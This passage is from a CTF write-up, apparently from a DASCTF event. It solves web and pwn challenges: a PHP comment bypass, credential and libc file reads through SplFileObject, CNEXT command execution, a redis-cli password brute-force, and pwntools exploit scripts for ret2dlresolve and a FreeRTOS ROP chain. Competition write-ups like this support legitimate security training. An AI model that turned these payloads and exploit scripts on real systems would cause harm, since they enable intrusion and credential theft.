<p><code>#</code>作为php的单行注释符，在遇到<code>?&gt;</code>会强制结束PHP模式，使得后续代码被当作新代码块执行。所以传参<code>?shell=?&gt;&lt;?php echo 11111;</code>即可绕过注释执行代码。</p>
<p>进一步利用发现，禁用了除index用到的<code>preg_match</code>以外的<strong>所有函数都</strong>disable_function（no_careee.php是为了防止非预期ban掉的一些结构）。</p>
<p>这里的思路是利用php原生类进行下一步利用。例如：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690557190-8cbca368-8ba7-4525-b454-601c56cd5e4d.png"
                      alt="img"
                ></p>
<p>passwd中可以看到redis，后面是对redis进行利用。但是常见ctf题目中利用SoapClient进行ssrf的操作并不可行，一方面靶机没有安装soap拓展，而且SoapClient会提示只支持http&#x2F;https协议。</p>
<p>这里的思路是利用SplFileObject原生类配合CNEXT (CVE-2024-2961)进行命令执行。</p>
<p>读取maps和libc，利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%B0%86%E7%BB%93%E6%9E%9C%E5%86%99%E5%85%A5/tmp/tmpp.txt%E6%9A%82%E5%AD%98%E3%80%82" >https://github.com/kezibei/php-filter-iconv项目进行命令执行，执行无回显，将结果写入/tmp/tmpp.txt暂存。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;file:///proc/self/maps&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690628398-cfedb70e-73e0-4fe5-ae61-ef166a9de1a4.png"
                      alt="img"
                ></p>
<p>可以看到redis需要密码认证。</p>
<p>这里构造<code>echo AUTH password | redis-cli -h 127.0.0.1 -p 6379 --raw | grep -q &#39;^OK$&#39; &amp;&amp; echo password &gt;&gt; /tmp/pass.txt</code></p>
<p>进行爆破，利用密码正确与否的不同回显，将正确密码写入tmp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690948098-b2578e21-8d2d-4a61-a93b-3af266e54e78.png"
                      alt="img"
                ></p>
<p>读取&#x2F;tmp&#x2F;pass.txt</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690959276-fb0a43a9-4d3e-471e-8bc7-d76cd907e9b7.png"
                      alt="img"
                ></p>
<p>flag在redis中：<code>echo &quot;auth admin123\nkeys *\nget flag&quot; | redis-cli -h 127.0.0.1 -p 6379 &gt; /tmp/flag</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/image-20250821121648280.png"
                      alt="image-20250821121648280"
                ></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="题目-mini"><a href="#题目-mini" class="headerlink" title="题目-mini"></a>题目-mini</h2><p>预期解是伪造重定位结构体进行ret2dlresolve，调用system函数即可，重定位结构体只使用部分字段</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.update(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&#x27;qterminal&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x404018</span>+<span class="number">0x10</span>)+p64(<span class="number">0x401133</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x404000</span>+<span class="number">0x110</span>+<span class="number">0x10</span>)+p64(<span class="number">0x401133</span>))<span class="comment">#0x404018 -&gt;str_bin_sh</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404000</span>+<span class="number">0x100</span>)+p32(<span class="number">7</span>)+p32((<span class="number">0x404000</span>+<span class="number">0x210</span>-<span class="number">0x3FF5C0</span>)//<span class="number">0x18</span>)+p64(<span class="number">0x404000</span>+<span class="number">0x210</span>+<span class="number">0x10</span>)+p64(<span class="number">0x401133</span>))<span class="comment">#0x404000+0x110 -&gt;rel</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404000</span>+<span class="number">0x300</span>-<span class="number">0x3FF568</span>)+p64(<span class="number">0x12</span>)+p64(<span class="number">0x404000</span>+<span class="number">0x300</span>+<span class="number">0x10</span>)+p64(<span class="number">0x401133</span>))<span class="comment">#0x404000+0x210 -&gt;sym</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;system\x00\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x404000</span>+<span class="number">0xe00</span>+<span class="number">0x10</span>)+p64(<span class="number">0x401133</span>))<span class="comment">#0x404000+0x300 -&gt;str</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x404000</span>+<span class="number">0xe00</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)+p64(<span class="number">0x401133</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x401126</span>)+p64(<span class="number">0x401020</span>)+p64(<span class="number">0x401097</span>)+p64((<span class="number">0x404000</span>+<span class="number">0x110</span>-<span class="number">0x4004E0</span>)//<span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="题目-RRRTOS"><a href="#题目-RRRTOS" class="headerlink" title="题目-RRRTOS"></a>题目-RRRTOS</h2><p>通过关键字符串与函数逻辑可以判断时FreeRTOS</p>
<p>MPU V1直接把内核指针暴露给进程，task 需要先调用 wrapper 层的接口 MPU_xxx，再由 wrapper 层调用 kernel api，这个过程可以传递伪造的指针</p>
<p>bindiff可以恢复大概的符号表，有两个任务，reader,writer,其中写入存在阻塞</p>
<p>问题出现在整数溢出，2**32-xx有符号负数，增加存款，可以购买flag</p>
<p>用伪造的指针写入MPUCR除能mpu</p>
<p>两个read间存在竞争可以通过回显判断写入对象或是阻塞后写入，最后输出flag</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">context.update(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">base = [</span><br><span class="line">    <span class="string">&#x27;qemu-system-arm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-machine&#x27;</span>, <span class="string">&#x27;mps2-an385&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-cpu&#x27;</span>, <span class="string">&#x27;cortex-m3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-monitor&#x27;</span>, <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-serial&#x27;</span>, <span class="string">&#x27;stdio&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-nographic&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-kernel&#x27;</span>, <span class="string">&#x27;./build/main.elf&#x27;</span></span><br><span class="line">]</span><br><span class="line">gdb_cmd=[</span><br><span class="line">    <span class="string">&#x27;-ex&#x27;</span>,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-ex&#x27;</span>,<span class="string">&#x27;b* 0x17C54&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-ex&#x27;</span>,<span class="string">&#x27;b* 0x1078A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-ex&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-ex&#x27;</span>,<span class="string">&#x27;si&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;./build/main.elf&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    debug=<span class="number">0</span></span><br><span class="line">    dd=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25250</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> dd:</span><br><span class="line">            p=process(base+[<span class="string">&#x27;-S&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>])</span><br><span class="line">            subprocess.Popen([<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;--&#x27;</span>,<span class="string">&#x27;gdb-multiarch&#x27;</span>]+gdb_cmd)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p=process(base)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_send</span>(<span class="params">payload</span>):</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.send(<span class="built_in">bytes</span>([byte]))</span><br><span class="line">                res = p.recv(<span class="number">1</span>, timeout=<span class="number">0.05</span>)</span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span>    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;shovel &#x27;</span>+<span class="built_in">str</span>(<span class="number">2</span>**<span class="number">32</span>-<span class="number">10000</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;other&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.clean()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">    payload+=p32(<span class="number">1</span>)<span class="comment">#r7</span></span><br><span class="line">    payload+=p32(<span class="number">0x163CA</span>+<span class="number">1</span>)<span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    payload+=p32(<span class="number">0XE000ED94</span>-<span class="number">0x1c</span>)<span class="comment">#r4-r0-mpu</span></span><br><span class="line">    payload+=p32(<span class="number">0x163CA</span>+<span class="number">1</span>)<span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    payload+=p32(<span class="number">0</span>)<span class="comment">#r4</span></span><br><span class="line">    payload+=p32(<span class="number">0x12B28</span>+<span class="number">1</span>)<span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    payload+=p32(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload+=p32(<span class="number">0x1075c</span>+<span class="number">1</span>)<span class="comment">#pc-svc</span></span><br><span class="line"></span><br><span class="line">    payload+=p32(<span class="number">0</span>)<span class="comment">#r7</span></span><br><span class="line">    payload+=p32(<span class="number">0x17292</span>+<span class="number">1</span>)<span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    payload+=p32(<span class="number">0x20000000</span>)</span><br><span class="line">    payload+=p32(<span class="number">0x113C4</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#TimerSetTimerID  xTimer-&gt;pvTimerID = pvNewID  +0x1c</span></span><br><span class="line">    my_send(payload)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    res=p.recvall(timeout=<span class="number">2</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    match_group = re.findall(<span class="string">&quot;DASCTF&#123;(.*?)&#125;&quot;</span>, res)</span><br><span class="line">    <span class="keyword">if</span> match_group:</span><br><span class="line">        flag = match_group[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = exp()</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>,flag)</span><br><span class="line">                pause()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exploit()</span><br></pre></td></tr></table></figure></div>

<h2 id="题目-NSUSServer"><a href="#题目-NSUSServer" class="headerlink" title="题目-NSUSServer"></a>题目-NSUSServer</h2><ol>
<li>由于提供附件中有一个库文件不存在，而在ldd后可以发现这个库文件是在当前目录下的，所以应该在提供的主程序中找到可以泄漏文件的地方，那么就可以通过<code>send_file_with_headers</code>这个当文件存在时就会输出文件的地方来输出<code>a.so</code></li>
</ol>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">send_file_with_headers</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-B4h]</span></span><br><span class="line">    <span class="type">char</span> *s; <span class="comment">// [rsp+20h] [rbp-B0h]</span></span><br><span class="line">    <span class="type">__off_t</span> st_size; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">    stat buf; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    fd = open(a2, <span class="number">0</span>);</span><br><span class="line">    s = (<span class="type">char</span> *)operator new[](<span class="number">0x1000</span>uLL);</span><br><span class="line">    fstat(fd, &amp;buf);</span><br><span class="line">    st_size = buf.st_size;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a2, <span class="string">&quot;.ico&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, aico, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a2, <span class="string">&quot;.jpg&quot;</span>) || <span class="built_in">strstr</span>(a2, <span class="string">&quot;.jpeg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, ajpg, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a2, <span class="string">&quot;.png&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, apng, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a2, <span class="string">&quot;.css&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, acss, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a2, <span class="string">&quot;.js&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, ajs, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x1000</span>uLL, atxt, st_size);</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    send(a1, s, v2, <span class="number">0</span>);</span><br><span class="line">    sendfile(a1, fd, <span class="number">0LL</span>, <span class="number">0xFFFFFFFF</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( s )</span><br><span class="line">        operator delete[](s);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<code>send_file_with_headers</code>前后没有对<code>a.so</code>的输出进行特殊处理，所以可以在<code>snprintf(s, 0x1000uLL, atxt, st_size);</code>这一句里面输出<code>a.so</code>。据此我们可以写出如下的第一部分的exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">io = remote()</span><br><span class="line"></span><br><span class="line">zz = <span class="string">&#x27;&#x27;&#x27;GET /a.so HTTP/1.1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(zz.encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)  <span class="comment"># 跳过HTTP头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.so&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chunk = io.recv(<span class="number">4096</span>, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            f.write(chunk)</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></div>

<ol>
<li>根据泄漏的<code>a.so</code>，可以获得到<code>afunc</code>函数的信息，其中存在</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">afunc</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+13h] [rbp-8Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  _BYTE v8[<span class="number">20</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">72</span>]; <span class="comment">// [rsp+40h] [rbp-60h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="built_in">strstr</span>(a2, <span class="string">&quot;input=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 += <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">511</span>; ++i )</span><br><span class="line">      v9[i] = v7[i];</span><br><span class="line">    <span class="built_in">send</span>(a1, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 13\r\n\r\nHello, World!&quot;</span>, <span class="number">0x56</span>uLL, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">    std::string::basic_string&lt;std::allocator&lt;<span class="type">char</span>&gt;&gt;(v8, <span class="string">&quot;HTTP/1.1 400 Bad Request\r\n\r\nMissing input parameter.&quot;</span>, &amp;v5);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">    v2 = std::string::<span class="built_in">length</span>(v8);</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">void</span> *)std::string::<span class="built_in">c_str</span>(v8);</span><br><span class="line">    <span class="built_in">send</span>(a1, v3, v2, <span class="number">0</span>);</span><br><span class="line">    std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

